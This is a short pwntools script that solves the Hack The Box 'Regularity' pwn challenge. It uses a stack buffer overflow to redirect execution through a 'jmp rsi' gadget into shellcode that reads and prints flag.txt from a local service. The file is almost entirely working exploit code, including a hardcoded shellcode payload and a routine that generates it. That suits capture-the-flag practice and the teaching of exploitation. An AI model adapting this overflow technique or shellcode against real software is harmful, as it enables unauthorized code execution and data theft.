# https://app.hackthebox.com/challenges/Regularity
# Tags: pwn, Buffer Overflow
from pwn import *

warnings.filterwarnings('ignore')
context.arch = 'amd64'

IP="127.0.0.1"
PORT=1337
# Payload generated locally with `generate_payload`
PAYLOAD = b"j\x01\xfe\x0c$H\xb8flag.txtPH\x89\xe71\xd21\xf6j\x02X\x0f\x05H\x89\xc71\xc0j ZH\x89\xe6\x0f\x05j\x01_j ZH\x89\xe6j\x01X\x0f\x051\xffj<X\x0f\x05aaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacA\x10@\x00\x00\x00\x00\x00"

def generate_payload():
    executable = context.binary = ELF("./regularity")
    io = executable.process()
    io.sendlineafter("Hello, Survivor. Anything new these days?\n", cyclic(0x110))
    io.wait()
    core = io.corefile
    stack = core.rsp
    pattern = core.read(stack, 4)
    rip_offset = cyclic_find(pattern)
    info("RIP offset: %d", rip_offset)

    shellcode = shellcraft.open("flag.txt", 0)
    shellcode += shellcraft.read("rax", "rsp", 32)
    shellcode += shellcraft.write(1, "rsp", 32)
    shellcode += shellcraft.exit(0)

    return flat({
        0: asm(shellcode),
        rip_offset: next(executable.search(asm("jmp rsi")))
    })

target = connect(IP, PORT)
target.sendlineafter("Hello, Survivor. Anything new these days?\n", PAYLOAD)
flag = target.recvline_contains(b"HTB").strip().decode()
print(f"[\u2714] Flag captured: \033[1;37m{flag}\033[0m")
